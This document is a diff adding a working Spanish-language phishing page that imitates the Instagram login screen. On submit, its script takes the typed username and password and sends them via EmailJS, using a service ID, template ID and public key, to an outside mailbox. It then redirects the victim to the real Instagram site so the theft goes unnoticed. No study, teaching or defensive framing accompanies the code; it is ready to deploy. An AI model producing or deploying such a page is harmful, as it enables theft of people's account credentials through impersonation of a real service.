@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram - Iniciar Sesión</title>
+    <style>
+        /* Estilos */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            color: #8e8e8e;
+        }
+        .container {
+            width: 100%;
+            max-width: 350px;
+            text-align: center;
+            padding: 20px;
+        }
+        .login-box {
+            background-color: #fff;
+            border: 1px solid #dbdbdb;
+            padding: 20px 40px;
+            border-radius: 8px;
+            margin-bottom: 10px;
+        }
+        .instagram-logo {
+            width: 180px;
+            margin: 20px 0;
+        }
+        .login-box input[type="text"],
+        .login-box input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin: 6px 0;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            background-color: #fafafa;
+            font-size: 14px;
+        }
+        .login-box button {
+            width: 100%;
+            padding: 10px;
+            background-color: #0095f6;
+            color: #fff;
+            font-weight: bold;
+            border: none;
+            border-radius: 3px;
+            cursor: pointer;
+            font-size: 14px;
+            margin-top: 10px;
+        }
+        .login-box button:hover {
+            background-color: #007bb5;
+        }
+        .separator {
+            display: flex;
+            align-items: center;
+            color: #8e8e8e;
+            font-size: 13px;
+            margin: 20px 0;
+        }
+        .separator::before,
+        .separator::after {
+            content: "";
+            flex: 1;
+            height: 1px;
+            background-color: #dbdbdb;
+        }
+        .separator::before {
+            margin-right: 10px;
+        }
+        .separator::after {
+            margin-left: 10px;
+        }
+        .facebook-login {
+            color: #385185;
+            font-weight: bold;
+            text-decoration: none;
+            display: block;
+            margin: 15px 0;
+        }
+        .forgot-password {
+            font-size: 12px;
+            color: #00376b;
+            text-decoration: none;
+        }
+        .footer {
+            margin-top: 20px;
+            font-size: 14px;
+        }
+        .footer a {
+            color: #0095f6;
+            text-decoration: none;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <!-- Logo de Instagram -->
+            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram" class="instagram-logo">
+            <form>
+                <input type="text" id="username" placeholder="Teléfono, usuario o correo electrónico" required>
+                <input type="password" id="password" placeholder="Contraseña" required>
+                <button type="submit">Entrar</button>
+            </form>
+            <div class="separator">O</div>
+            <a href="#" class="facebook-login">Iniciar sesión con Facebook</a>
+            <a href="#" class="forgot-password">¿Has olvidado la contraseña?</a>
+        </div>
+        <div class="footer">
+            ¿No tienes una cuenta? <a href="#">Regístrate</a>
+        </div>
+    </div>
+
+    <!-- Cargar EmailJS desde el CDN -->
+    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            emailjs.init("n_vRut4ALKV7zCPLt");  // Asegúrate de reemplazar con tu clave pública
+
+            // Función para manejar el envío del formulario
+            function validateAndRedirect(event) {
+                event.preventDefault();
+                const username = document.getElementById('username').value;
+                const password = document.getElementById('password').value;
+
+                if (username.trim() && password.trim()) {
+                    // Enviar datos a través de EmailJS
+                    emailjs.send("service_a862daq", "template_wyaag9t", {
+                        username: username,
+                        password: password
+                    })
+                    .then(function(response) {
+                        console.log('Correo enviado exitosamente:', response.status, response.text);
+                        // Redirigir a Instagram después del envío exitoso
+                        window.location.href = "https://www.instagram.com/";
+                    })
+                    .catch(function(error) {
+                        alert('Error al enviar el correo: ' + JSON.stringify(error));
+                    });
+                } else {
+                    alert("Por favor, completa ambos campos.");
+                }
+            }
+
+            // Asigna la función al evento submit del formulario
+            const form = document.querySelector("form");
+            form.addEventListener("submit", validateAndRedirect);
+        });
+    </script>
+</body>
+</html>
+
+
+
